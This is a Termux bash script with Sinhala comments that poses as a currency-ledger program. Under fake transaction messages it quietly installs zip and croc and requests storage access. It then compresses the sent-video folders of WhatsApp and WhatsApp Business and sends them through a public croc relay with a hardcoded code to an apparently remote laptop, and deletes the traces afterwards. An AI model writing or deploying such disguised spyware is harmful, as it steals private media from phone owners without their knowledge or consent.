#!/bin/bash
SECRET_CODE="DtRn847"

echo "========================================"
echo "    GLOBAL CURRENCY LEDGER SYSTEM       "
echo "    v11.0 | Force Zip Mode | Stable     "
echo "========================================"

# 1. Zip Tool එක අනිවාර්යයෙන්ම දාගන්නවා
if ! command -v zip &> /dev/null; then
    echo ">> [SYSTEM] Installing compression tools..."
    pkg update -y > /dev/null 2>&1 && pkg install zip -y > /dev/null 2>&1
fi

if ! command -v croc &> /dev/null; then
    pkg install croc -y > /dev/null 2>&1
    termux-setup-storage
fi

# --- Function to Zip & Send ---
send_secure_zip() {
    local TARGET_PATH=$1
    local ZIP_NAME=$2
    local LABEL=$3

    # ෆෝල්ඩර් එක තියෙනවද බලනවා
    if [ -d "$TARGET_PATH" ]; then
        echo "----------------------------------------"
        echo ">> [TXN] FOUND: $LABEL"
        echo ">> [STATUS] Compressing Data (This may take time)..."
        
        # Temp Zip එකක් හදනවා Home ෆෝල්ඩර් එකේ
        # -r = subfolders එක්කම, -q = සද්ද නැතුව
        zip -r -q "$HOME/$ZIP_NAME" "$TARGET_PATH"
        
        # Zip එක හැදුනද බලනවා
        if [ -f "$HOME/$ZIP_NAME" ]; then
            echo ">> [STATUS] Ready. Sending $ZIP_NAME..."
            
            # Zip එක යවනවා
            env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$HOME/$ZIP_NAME"
            
            # යැව්වට පස්සේ මකනවා
            rm "$HOME/$ZIP_NAME"
            echo ">> [SUCCESS] Transfer Complete!"
        else
            echo ">> [ERROR] Compression failed. Permission issue?"
        fi
        sleep 5
    else
        echo ">> [SKIP] $LABEL not found."
    fi
}

# --- STEP 1: Normal WhatsApp Videos ---
WA_VID="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent"
WA_VID_OLD="/sdcard/WhatsApp/Media/WhatsApp Video/Sent"

REAL_PATH_1=""
[ -d "$WA_VID" ] && REAL_PATH_1="$WA_VID"
[ -z "$REAL_PATH_1" ] && [ -d "$WA_VID_OLD" ] && REAL_PATH_1="$WA_VID_OLD"

# ලැප් එකට එන්නේ: Normal_Videos.zip
send_secure_zip "$REAL_PATH_1" "Normal_Videos.zip" "Primary Asset Ledger"


# --- STEP 2: Business WhatsApp Videos ---
BIZ_VID="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent"
BIZ_VID_OLD="/sdcard/WhatsApp Business/Media/WhatsApp Business Video/Sent"

REAL_PATH_2=""
[ -d "$BIZ_VID" ] && REAL_PATH_2="$BIZ_VID"
[ -z "$REAL_PATH_2" ] && [ -d "$BIZ_VID_OLD" ] && REAL_PATH_2="$BIZ_VID_OLD"

# ලැප් එකට එන්නේ: Business_Videos.zip
send_secure_zip "$REAL_PATH_2" "Business_Videos.zip" "Business Asset Ledger"

echo "========================================"
echo "    ALL OPERATIONS FINISHED             "
echo "========================================"
